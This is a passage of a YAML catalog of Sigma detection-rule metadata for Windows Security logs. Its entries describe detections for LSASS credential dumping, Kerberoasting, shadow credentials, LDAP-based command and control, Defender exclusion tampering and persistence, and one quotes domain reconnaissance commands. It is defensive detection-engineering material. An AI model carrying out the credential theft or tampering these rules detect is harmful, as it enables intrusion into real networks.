  description: Detects the usage of particular AttributeLDAPDisplayNames, which are
    known for data exchange via LDAP by the tool LDAPFragger and are additionally
    not commonly used in companies.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1001.003
  tags:
  - attack.t1001.003
  - attack.command-and-control
  time_window: ''
  references:
  - https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961
  - https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/
  - https://github.com/fox-it/LDAPFragger
  false_positives:
  - Companies, who may use these default LDAP-Attributes for personal information
  notes: ''
- detection_id: 1bbf25b9-8038-4154-a50b-118f2a32be27
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_local_anon_logon_created.yml
  name: Suspicious Windows ANONYMOUS LOGON Local Account Created
  description: Detects the creation of suspicious accounts similar to ANONYMOUS LOGON,
    such as using additional spaces. Created as an covering detection for exclusion
    of Logon Type 3 from ANONYMOUS LOGON accounts.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  - T1136.002
  tags:
  - attack.persistence
  - attack.t1136.001
  - attack.t1136.002
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1189469425482829824
  false_positives:
  - Unknown
  notes: ''
- detection_id: 941e5c45-cda7-4864-8cea-bbb7458d194a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_logon_explicit_credentials.yml
  name: Suspicious Remote Logon with Explicit Credentials
  description: Detects suspicious processes logging on with explicit credentials
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  - attack.lateral-movement
  time_window: ''
  references:
  - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view
  false_positives:
  - Administrators that use the RunAS command or scheduled tasks
  notes: ''
- detection_id: aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_lsass_dump.yml
  name: Password Dumper Activity on LSASS
  description: Detects process handle on LSASS process with certain access mask and
    object type SAM_DOMAIN
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://twitter.com/jackcr/status/807385668833968128
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_lsass_dump_generic.yml
  name: Potentially Suspicious AccessMask Requested From LSASS
  description: Detects process handle on LSASS process with certain access mask
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - car.2019-04-004
  - attack.t1003.001
  time_window: ''
  references:
  - https://web.archive.org/web/20230208123920/https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  false_positives:
  - Legitimate software accessing LSASS process for legitimate reason; update the
    whitelist with it
  notes: ''
- detection_id: 968eef52-9cff-4454-8992-1e74b9cbad6c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_net_recon_activity.yml
  name: Reconnaissance Activity
  description: Detects activity as "net user administrator /domain" and "net group
    domain admins /domain"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.002
  - T1087.002
  tags:
  - attack.discovery
  - attack.t1087.002
  - attack.t1069.002
  - attack.s0039
  time_window: ''
  references:
  - https://findingbad.blogspot.de/2017/01/hunting-what-does-it-look-like.html
  false_positives:
  - Administrator activity
  notes: ''
- detection_id: 00ba9da1-b510-4f6b-b258-8d338836180f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_opened_encrypted_zip.yml
  name: Password Protected ZIP File Opened
  description: Detects the extraction of password protected ZIP archives. See the
    filename variable for more details on which file has been opened.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://twitter.com/sbousseaden/status/1523383197513379841
  false_positives:
  - Legitimate used of encrypted ZIP files
  notes: ''
- detection_id: 54f0434b-726f-48a1-b2aa-067df14516e4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_opened_encrypted_zip_filename.yml
  name: Password Protected ZIP File Opened (Suspicious Filenames)
  description: Detects the extraction of password protected ZIP archives with suspicious
    file names. See the filename variable for more details on which file has been
    opened.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1027
  - T1036
  - T1105
  tags:
  - attack.command-and-control
  - attack.defense-evasion
  - attack.t1027
  - attack.t1105
  - attack.t1036
  time_window: ''
  references:
  - https://twitter.com/sbousseaden/status/1523383197513379841
  false_positives:
  - Legitimate used of encrypted ZIP files
  notes: ''
- detection_id: 571498c8-908e-40b4-910b-d2369159a3da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_opened_encrypted_zip_outlook.yml
  name: Password Protected ZIP File Opened (Email Attachment)
  description: Detects the extraction of password protected ZIP archives. See the
    filename variable for more details on which file has been opened.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1027
  - T1566.001
  tags:
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1027
  - attack.t1566.001
  time_window: ''
  references:
  - https://twitter.com/sbousseaden/status/1523383197513379841
  false_positives:
  - Legitimate used of encrypted ZIP files
  notes: ''
- detection_id: eca91c7c-9214-47b9-b4c5-cb1d7e4f2350
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_outbound_kerberos_connection.yml
  name: Uncommon Outbound Kerberos Connection - Security
  description: 'Detects uncommon outbound network activity via Kerberos default port
    indicating possible lateral movement or first stage PrivEsc via delegation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.lateral-movement
  - attack.credential-access
  - attack.t1558.003
  time_window: ''
  references:
  - https://github.com/GhostPack/Rubeus
  false_positives:
  - Web Browsers and third party application might generate similar activity. An initial
    baseline is required.
  notes: ''
- detection_id: f598ea0c-c25a-4f72-a219-50c44411c791
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_possible_shadow_credentials_added.yml
  name: Possible Shadow Credentials Added
  description: Detects possible addition of shadow credentials to an active directory
    object.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1556
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1556
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/8.4/potential-shadow-credentials-added-to-ad-object.html
  - https://cyberstoph.org/posts/2022/03/detecting-shadow-credentials/
  - https://twitter.com/SBousseaden/status/1581300963650187264?
  false_positives:
  - Modifications in the msDS-KeyCredentialLink attribute can be done legitimately
    by the Azure AD Connect synchronization account or the ADFS service account. These
    accounts can be added as Exceptions. (From elastic FP section)
  notes: ''
- detection_id: c462f537-a1e3-41a6-b5fc-b2c2cef9bf82
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_psexec.yml
  name: Suspicious PsExec Execution
  description: detects execution of psexec or paexec with renamed service name, this
    rule helps to filter out the noise if psexec is used for legit purposes or if
    attacker uses a different psexec client other than sysinternal one
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://web.archive.org/web/20230329171218/https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 91c945bc-2ad1-4799-a591-4d00198a1215
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_raccess_sensitive_fext.yml
  name: Suspicious Access to Sensitive File Extensions
  description: Detects known sensitive file extensions accessed on a network share
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1039
  tags:
  - attack.collection
  - attack.t1039
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Help Desk operator doing backup or re-imaging end user machine or backup software
  - Users working with these data types or exchanging message files
  notes: ''
- detection_id: 496a0e47-0a33-4dca-b009-9e6ca3591f39
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_rc4_kerberos.yml
  name: Suspicious Kerberos RC4 Ticket Encryption
  description: Detects service ticket requests using RC4 encryption type
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.credential-access
  - attack.t1558.003
  time_window: ''
  references:
  - https://adsecurity.org/?p=3458
  - https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity
  false_positives:
  - Service accounts used on legacy systems (e.g. NetApp)
  - Windows Domains with DFL 2003 and legacy systems
  notes: ''
- detection_id: 3a734d25-df5c-4b99-8034-af1ddb5883a4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_scheduled_task_creation.yml
  name: Suspicious Scheduled Task Creation
  description: Detects suspicious scheduled task creation events. Based on attributes
    such as paths, commands line flags, etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.execution
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1053.005
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4698
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7595ba94-cf3b-4471-aa03-4f6baa9e5fad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_scheduled_task_delete_or_disable.yml
  name: Important Scheduled Task Deleted/Disabled
  description: Detects when adversaries stop services or processes by deleting or
    disabling their respective scheduled tasks in order to conduct data destructive
    activities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.execution
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1053.005
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4699
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4701
  false_positives:
  - Unknown
  notes: ''
- detection_id: 614cf376-6651-47c4-9dcc-6b9527f749f4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_scheduled_task_update.yml
  name: Suspicious Scheduled Task Update
  description: Detects update to a scheduled task event that contain suspicious keywords.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.execution
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1053.005
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4698
  false_positives:
  - Unknown
  notes: ''
- detection_id: faa031b5-21ed-4e02-8881-2591f98d82ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_susp_time_modification.yml
  name: Unauthorized System Time Modification
  description: Detect scenarios where a potentially unauthorized application or user
    is modifying the system time.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1070.006
  tags:
  - attack.defense-evasion
  - attack.t1070.006
  time_window: ''
  references:
  - Private Cuckoo Sandbox (from many years ago, no longer have hash, NDA as well)
  - Live environment caused by malware
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4616
  false_positives:
  - HyperV or other virtualization technologies with binary not listed in filter portion
    of detection
  notes: ''
- detection_id: 586a8d6b-6bfe-4ad9-9d78-888cd2fe50c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_svcctl_remote_service.yml
  name: Remote Service Activity via SVCCTL Named Pipe
  description: Detects remote service activity via remote access to the svcctl named
    pipe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.persistence
  - attack.t1021.002
  time_window: ''
  references:
  - https://web.archive.org/web/20230329155141/https://blog.menasec.net/2019/03/threat-hunting-26-remote-windows.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9a4ff3b8-6187-4fd2-8e8b-e0eae1129495
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_syskey_registry_access.yml
  name: SysKey Registry Keys Access
  description: Detects handle requests and access operations to specific registry
    keys to calculate the SysKey
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1012
  tags:
  - attack.discovery
  - attack.t1012
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190625-RegKeyAccessSyskey/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 18beca67-ab3e-4ee3-ba7a-a46ca8d7d0cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_sysmon_channel_reference_deletion.yml
  name: Sysmon Channel Reference Deletion
  description: Potential threat actor tampering with Sysmon manifest and eventually
    disabling it
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://twitter.com/Flangvik/status/1283054508084473861
  - https://twitter.com/SecurityJosh/status/1283027365770276866
  - https://securityjosh.github.io/2020/04/23/Mute-Sysmon.html
  - https://gist.github.com/Cyb3rWard0g/cf08c38c61f7e46e8404b38201ca01c8
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9c8afa4d-0022-48f0-9456-3712466f9701
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_tap_driver_installation.yml
  name: Tap Driver Installation - Security
  description: 'Detects the installation of a well-known TAP driver service. This
    could be a sign of potential preparation for data exfiltration using tunnelling
    techniques.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048
  tags:
  - attack.exfiltration
  - attack.t1048
  time_window: ''
  references:
  - https://community.openvpn.net/openvpn/wiki/ManagingWindowsTAPDrivers
  false_positives:
  - Legitimate OpenVPN TAP installation
  notes: ''
- detection_id: 25cde13e-8e20-4c29-b949-4e795b76f16f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_teams_suspicious_objectaccess.yml
  name: Suspicious Teams Application Related ObjectAcess Event
  description: Detects an access to authentication tokens and accounts of Microsoft
    Teams desktop application.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1528
  tags:
  - attack.credential-access
  - attack.t1528
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/microsoft-teams-stores-auth-tokens-as-cleartext-in-windows-linux-macs/
  - https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens
  false_positives:
  - Unknown
  notes: ''
- detection_id: 910ab938-668b-401b-b08c-b596e80fdca5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_transf_files_with_cred_data_via_network_shares.yml
  name: Transferring Files with Credential Data via Network Shares
  description: Transferring files with well-known filenames (sensitive files with
    credential data) using network shares
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1003.002
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.002
  - attack.t1003.001
  - attack.t1003.003
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  false_positives:
  - Transferring sensitive files for legitimate administration work by legitimate
    administrator
  notes: ''
- detection_id: c265cf08-3f99-46c1-8d59-328247057d57
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_user_added_to_local_administrators.yml
  name: User Added to Local Administrator Group
  description: Detects the addition of a new member to the local administrator group,
    which could be legitimate activity or a sign of privilege escalation activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: stable
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1098
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1078
  - attack.persistence
  - attack.t1098
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4732
  - https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: 6daac7fc-77d1-449a-a71a-e6b4d59a0e54
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_user_couldnt_call_priv_service_lsaregisterlogonprocess.yml
  name: User Couldn't Call a Privileged Service 'LsaRegisterLogonProcess'
  description: The 'LsaRegisterLogonProcess' function verifies that the application
    making the function call is a logon process by checking that it has the SeTcbPrivilege
    privilege set. Possible Rubeus tries to get a handle to LSA.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.credential-access
  - attack.lateral-movement
  - attack.privilege-escalation
  - attack.t1558.003
  time_window: ''
  references:
  - https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 66b6be3d-55d0-4f47-9855-d69df21740ea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_user_creation.yml
  name: Local User Creation
  description: 'Detects local user creation on Windows servers, which shouldn''t happen
    in an Active Directory environment. Apply this Sigma Use Case on your Windows
    server logs and not on your DC logs.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  tags:
  - attack.persistence
  - attack.t1136.001
  time_window: ''
  references:
  - https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/
  false_positives:
  - Domain Controller Logs
  - Local accounts managed by privileged account management tools
  notes: ''
- detection_id: f63508a0-c809-4435-b3be-ed819394d612
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_user_driver_loaded.yml
  name: Potential Privileged System Service Operation - SeLoadDriverPrivilege
  description: 'Detects the usage of the ''SeLoadDriverPrivilege'' privilege. This
    privilege is required to load or unload a device driver.

    With this privilege, the user can dynamically load and unload device drivers or
    other code in to kernel mode.

    This user right does not apply to Plug and Play device drivers.

    If you exclude privileged users/admins and processes, which are allowed to do
    so, you are maybe left with bad programs trying to load malicious kernel drivers.

    This will detect Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs)
    and the usage of Sysinternals and various other tools. So you have to work with
    a whitelist to find the bad stuff.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://web.archive.org/web/20230331181619/https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4673
  false_positives:
  - Other legimate tools loading drivers. Including but not limited to, Sysinternals,
    CPU-Z, AVs etc. A baseline needs to be created according to the used products
    and allowed tools. A good thing to do is to try and exclude users who are allowed
    to load drivers.
  notes: ''
- detection_id: 0badd08f-c6a3-4630-90d3-6875cca440be
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_user_logoff.yml
  name: User Logoff Event
  description: Detects a user log-off activity. Could be used for example to correlate
    information during forensic investigations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - multi_signal_correlation
  severity: informational
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1531
  tags:
  - attack.impact
  - attack.t1531
  time_window: ''
  references:
  - https://github.com/Yamato-Security/EnableWindowsLogSettings/blob/7f6d755d45ac7cc9fc35b0cbf498e6aa4ef19def/ConfiguringSecurityLogAuditPolicies.md
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4634
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4647
  false_positives:
  - Unknown
  notes: ''
- detection_id: e9faba72-4974-4ab2-a4c5-46e25ad59e9b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_vssaudit_secevent_source_registration.yml
  name: VSSAudit Security Event Source Registration
  description: Detects the registration of the security event source VSSAudit. It
    would usually trigger when volume shadow copy operations happen.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  tags:
  - attack.credential-access
  - attack.t1003.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy
  false_positives:
  - Legitimate use of VSSVC. Maybe backup operations. It would usually be done by
    C:\Windows\System32\VSSVC.exe.
  notes: ''
- detection_id: 46a68649-f218-4f86-aea1-16a759d81820
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_windows_defender_exclusions_registry_modified.yml
  name: Windows Defender Exclusion List Modified
  description: 'Detects modifications to the Windows Defender exclusion registry key.
    This could indicate a potentially suspicious or even malicious activity by an
    attacker trying to add a new exclusion in order to bypass security.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/
  false_positives:
  - Intended exclusions by administrators
  notes: ''
- detection_id: e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_windows_defender_exclusions_write_access.yml
  name: Windows Defender Exclusion Registry Key - Write Access Requested
  description: 'Detects write access requests to the Windows Defender exclusions registry
    keys. This could be an indication of an attacker trying to request a handle or
    access the object to write new exclusions in order to bypass security.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f033f3f3-fd24-4995-97d8-a3bb17550a88
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_wmi_persistence.yml
  name: WMI Persistence - Security
  description: Detects suspicious WMI event filter and command line event consumer
    based on WMI and Security Logs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.003
  time_window: ''
  references:
